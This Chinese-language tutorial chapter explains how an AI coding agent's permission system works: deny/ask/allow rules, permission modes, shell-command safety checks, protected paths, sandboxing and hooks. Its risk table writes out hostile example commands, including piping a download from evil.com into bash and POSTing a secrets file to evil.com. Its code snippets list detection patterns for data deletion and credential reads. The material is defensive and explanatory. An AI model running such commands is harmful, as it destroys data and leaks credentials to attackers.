# 第3章：权限与安全系统

## 学习目标
1. 理解多层权限检查的完整流程
2. 理解 Permission Mode（default/plan/bypassPermissions/auto）的区别
3. 理解 BashTool 的命令安全分析机制
4. 理解权限规则的匹配逻辑（deny > ask > allow）

---

## 3.1 为什么需要权限系统？

Claude Code 让 AI 直接操作你的文件系统和终端。这意味着：

| 风险 | 示例 |
|------|------|
| 数据删除 | `rm -rf /important/data` |
| 凭证泄露 | `cat ~/.ssh/id_rsa` |
| 网络攻击 | `curl evil.com/malware \| bash` |
| 资源消耗 | 无限循环的 API 调用 |
| 数据外泄 | `curl -X POST evil.com -d @secrets.env` |

权限系统的核心原则：**Defense in Depth（纵深防御）**

```
Layer 1: Permission Rules (deny/ask/allow)
 └── Layer 2: Permission Mode (default/plan/bypass/auto)
 └── Layer 3: Tool-specific checks (BashTool security)
 └── Layer 4: Path safety checks (filesystem)
 └── Layer 5: Sandbox (macOS Seatbelt)
```

## 3.2 权限检查完整流程

核心函数：`hasPermissionsToUseToolInner()` (permissions.ts)

```
工具调用请求: { name: 'Bash', input: { command: 'npm install' } }
 │
 ▼
Step 1a: 整个工具是否被 DENY？
 │ 检查 alwaysDenyRules 中是否有匹配 'Bash' 的规则
 │ 如果有 → 直接拒绝，返回 { behavior: 'deny' }
 │
 ▼
Step 1b: 整个工具是否需要 ASK？
 │ 检查 alwaysAskRules 中是否有匹配 'Bash' 的规则
 │ 特殊：如果 sandbox 启用且命令可沙箱化 → 跳过 ask
 │ 如果有 → 返回 { behavior: 'ask' }
 │
 ▼
Step 1c: 工具自定义权限检查
 │ 调用 tool.checkPermissions(input, context)
 │ BashTool 会在这里做命令安全分析
 │
 ▼
Step 1d: 工具拒绝？
 │ 如果 checkPermissions 返回 'deny' → 直接拒绝
 │
 ▼
Step 1e: 需要用户交互？
 │ 如果 tool.requiresUserInteraction() 且结果是 'ask' → 必须询问
 │
 ▼
Step 1f: 内容级 ask 规则？
 │ 如果 checkPermissions 返回 ask + rule 类型 → 即使 bypass 也要询问
 │ 例如：Bash(npm publish:*) 规则
 │
 ▼
Step 1g: 安全检查（bypass 免疫）？
 │ .git/, .claude/, .vscode/, shell 配置文件
 │ 这些路径即使在 bypass 模式也需要确认
 │
 ▼
Step 2a: Permission Mode 检查
 │ bypassPermissions → 直接允许
 │ plan + isBypassAvailable → 直接允许
 │
 ▼
Step 2b: 整个工具是否被 ALLOW？
 │ 检查 alwaysAllowRules
 │ 如果有 → 允许
 │
 ▼
Step 3: 默认行为
 │ passthrough → 转为 ask
 └── 弹出权限确认对话框
```

## 3.3 Permission Rules 系统

### 规则来源

权限规则可以来自多个来源，按优先级排列：

```typescript
type ToolPermissionRulesBySource = {
  cliArg?: string[]; // CLI 参数 (--allowedTools)
  session?: string[]; // 当前会话中用户授权的
  localSettings?: string[]; // .claude/settings.json
  projectSettings?: string[]; // .claude/settings.json (项目级)
  policySettings?: string[]; // 企业策略
  command?: string[]; // /slash 命令授权的
};
```

### 规则格式

```
规则字符串格式: "ToolName" 或 "ToolName(content)"

示例:
"Bash" → 匹配所有 Bash 调用
"Bash(npm install)" → 精确匹配 'npm install' 命令
"Bash(npm:*)" → 前缀匹配所有 npm 开头的命令
"Bash(git *)" → 通配符匹配 git 命令
"Read" → 匹配所有文件读取
"Edit(/src/**)" → 匹配 /src/ 下的文件编辑
"mcp__server1" → 匹配 MCP server1 的所有工具
"Agent(Explore)" → 匹配 Explore 类型的 Agent
```

### 规则匹配优先级

```
DENY > ASK > ALLOW

如果同一个操作同时匹配了 deny 和 allow 规则，deny 胜出。
这是安全系统的基本原则：拒绝优先。
```

## 3.4 Permission Modes

| 模式 | 行为 | 适用场景 |
|------|------|----------|
| `default` | 每个操作都需要确认 | 默认模式，最安全 |
| `plan` | 只能查看，不能修改 | 代码审查、探索 |
| `bypassPermissions` | 自动允许所有操作 | 信任的自动化场景 |
| `acceptEdits` | 自动接受文件编辑 | 半自动模式 |
| `auto` | AI 分类器自动决策 | 实验性 |

### bypass 模式的安全边界

即使在 `bypassPermissions` 模式下，以下操作仍然需要确认：

```typescript
// Step 1f: 内容级 ask 规则不可绕过
if (toolPermissionResult.behavior === 'ask'
  && toolPermissionResult.decisionReason?.type === 'rule'
  && toolPermissionResult.decisionReason.rule.ruleBehavior === 'ask') {
  return toolPermissionResult; // 即使 bypass 也要问
}

// Step 1g: 安全路径检查不可绕过
if (toolPermissionResult.behavior === 'ask'
  && toolPermissionResult.decisionReason?.type === 'safetyCheck') {
  return toolPermissionResult; // .git/, .claude/ 等路径
}
```

**设计哲学：** 用户可以选择信任 AI，但某些安全底线不可逾越。

## 3.5 BashTool 权限系统深度解析

BashTool 是最复杂的工具，因为 shell 命令的安全性分析极其困难。

### 权限检查流程 (bashPermissions.ts)

```typescript
export const bashToolCheckPermission = (input, toolPermissionContext) => {
  const command = input.command.trim();

  // 1. 精确匹配检查
  const exactMatch = bashToolCheckExactMatchPermission(input, context);
  if (exactMatch.behavior === 'deny' || exactMatch.behavior === 'ask') {
    return exactMatch;
  }

  // 2. 前缀/通配符规则匹配
  const { matchingDenyRules, matchingAskRules, matchingAllowRules } =
  matchingRulesForInput(input, context, 'prefix');

  if (matchingDenyRules[0]) return { behavior: 'deny', ... };
  if (matchingAskRules[0]) return { behavior: 'ask', ... };

  // 3. 路径约束检查
  // (检查命令是否操作了允许目录之外的路径)

  // 4. 精确匹配允许
  if (exactMatch.behavior === 'allow') return exactMatch;

  // 5. 前缀匹配允许
  if (matchingAllowRules[0]) return { behavior: 'allow', ... };

  // 6. 默认：需要询问
  return { behavior: 'passthrough', ... };
};
```

### 命令安全分析 (bashSecurity.ts)

这个文件约 100KB，是整个项目中最大的安全相关文件。它分析 shell 命令的安全性：

```typescript
// 危险命令检测示例
const DANGEROUS_PATTERNS = [
  // 数据删除
  /rm\s+(-[rf]+\s+)*\//, // rm -rf /
  /mkfs/, // 格式化磁盘

  // 凭证访问
  /cat.*\.ssh/, // 读取 SSH 密钥
  /cat.*\.env/, // 读取环境变量

  // 代码执行
  /curl.*\|.*bash/, // 下载并执行
  /eval\s/, // eval 执行

  // 网络操作
  /curl.*-X\s*POST/, // POST 请求（可能外泄数据）
  /wget/, // 下载文件
];
```

## 3.6 文件系统权限 (filesystem.ts)

### 读权限检查

```typescript
export function checkReadPermissionForTool(tool, input, permissionContext) {
  const path = tool.getPath(input);
  const pathsToCheck = getPathsForPermissionCheck(path);
  // pathsToCheck 包含原始路径 + 符号链接解析后的路径

  // 1. UNC 路径防护（防止 NTLM 凭证泄露）
  for (const p of pathsToCheck) {
    if (p.startsWith('\\\\') || p.startsWith('//')) {
      return { behavior: 'ask', message: 'UNC path detected' };
    }
  }

  // 2. 检查 deny 规则
  // 3. 检查内容级 deny 规则
  // 4. 检查内容级 ask 规则
  // 5. 检查内容级 allow 规则
  // 6. 检查是否在工作目录内
  // → 在工作目录内 → 允许
  // → 不在工作目录内 → 继续检查
  // 7-11. 更多规则检查...
  // 12. 默认：需要询问
}
```

### 写权限检查

写权限比读权限更严格，额外检查：

```typescript
// 安全路径检查 (checkPathSafetyForAutoEdit)
const PROTECTED_PATHS = [
  '.git/', // Git 内部文件
  '.claude/', // Claude Code 配置
  '.vscode/', // VS Code 配置
  '.bashrc', // Shell 配置
  '.zshrc', // Shell 配置
  '.profile', // Shell 配置
  '.ssh/', // SSH 配置
  'package.json', // 依赖配置（可能引入恶意包）
];
// 这些路径即使在 bypass 模式也需要确认！
```

## 3.7 权限处理器 (toolPermission handlers)

当权限检查结果是 `ask` 时，需要一个处理器来决定如何处理：

```
hooks/toolPermission/handlers/
├── interactiveHandler.ts # 交互模式：弹出对话框询问用户
├── coordinatorHandler.ts # 协调器模式：自动决策
└── swarmWorkerHandler.ts # Swarm Worker：受限权限
```

### 交互模式处理器

```typescript
// interactiveHandler.ts (简化)
async function handlePermissionAsk(tool, input, context) {
  // 1. 显示权限请求 UI
  // "Claude wants to run: npm install"
  // [Allow] [Allow Always] [Deny]

  // 2. 等待用户响应
  const response = await waitForUserResponse();

  // 3. 处理响应
  switch (response) {
    case 'allow':
    return { behavior: 'allow' };
    case 'allowAlways':
    // 将规则添加到 session allow rules
    addToAlwaysAllowRules(tool.name, input);
    return { behavior: 'allow' };
    case 'deny':
    return { behavior: 'deny' };
  }
}
```

### 权限建议系统

当用户需要做决定时，系统会提供建议：

```typescript
// 例如 BashTool 的建议
suggestions: [
  {
    type: 'addRules',
    rules: [
      { toolName: 'Bash', ruleContent: 'npm install' }, // 精确匹配
      { toolName: 'Bash', ruleContent: 'npm:*' }, // 前缀匹配
    ],
    behavior: 'allow',
    destination: 'localSettings', // 保存到本地设置
  },
]
```

## 3.8 危险权限检测

系统会检测并阻止过于宽泛的权限规则：

```typescript
// permissionSetup.ts
export function isDangerousBashPermission(toolName, ruleContent) {
  if (toolName !== 'Bash') return false;

  // 工具级允许（无内容）= 允许所有命令 → 危险！
  if (ruleContent === undefined || ruleContent === '') return true;

  // 通配符 = 允许所有 → 危险！
  if (ruleContent.trim() === '*') return true;

  // 代码执行类命令
  const DANGEROUS_PATTERNS = [
    'python', 'python3', 'node', 'ruby', 'perl', // 脚本语言
    'bash', 'sh', 'zsh', // Shell
    'eval', 'exec', // 执行器
    'curl', 'wget', // 网络下载
    'ssh', // 远程连接
  ];

  return DANGEROUS_PATTERNS.some(p =>
  ruleContent.toLowerCase().startsWith(p)
);
}
```

**当检测到危险权限时：**
- 在 `auto` 模式下，这些规则会被自动剥离
- 在设置界面会显示警告
- 日志中会记录

## 3.9 Sandbox 系统

Claude Code 支持 macOS Seatbelt sandbox，为 Bash 命令提供额外的隔离层：

```
Sandbox 启用时的执行流程：

BashTool.call({ command: 'npm install' })
 │
 ▼
shouldUseSandbox(input) → true
 │
 ▼
SandboxManager.execute(command, {
 allowedPaths: [cwd, '/tmp', ...],
 deniedPaths: ['~/.ssh', '~/.aws', ...],
 allowNetwork: true, // 某些命令需要网络
})
 │
 ▼
sandbox-exec -f profile.sb -- bash -c 'npm install'
```

**Sandbox 的限制：**
- 只在 macOS 上可用
- 某些命令（如需要 ptrace 的调试器）不兼容
- 有 `dangerouslyDisableSandbox` 选项可以关闭

## 3.10 Hook 系统与权限

用户可以通过 Hook 脚本自定义权限逻辑：

```json
// .claude/settings.json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "python3 check_command.py"
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Edit",
        "hooks": [
          {
            "type": "command",
            "command": "eslint --fix $FILE_PATH"
          }
        ]
      }
    ]
  }
}
```

**Hook 的权限语义：**
- PreToolUse hook 返回 `allow` → 不会绕过 deny/ask 规则！
- PreToolUse hook 返回 `deny` → 直接拒绝
- 这确保了 hook 不能降低安全级别，只能提高

## 本章小结

| 概念 | 关键点 |
|------|--------|
| 纵深防御 | 5 层安全检查，每层独立 |
| 规则优先级 | DENY > ASK > ALLOW |
| Permission Mode | default/plan/bypass/auto，bypass 也有安全底线 |
| BashTool 安全 | 命令解析 + 危险模式检测 + 路径约束 |
| 文件系统安全 | 工作目录限制 + 保护路径 + UNC 防护 |
| Sandbox | macOS Seatbelt 隔离 |
| Hook 系统 | 用户自定义检查，不能降低安全级别 |

### 下一章预告
第4章将深入 **查询循环与 API 交互**——理解 query.ts 的核心循环逻辑。

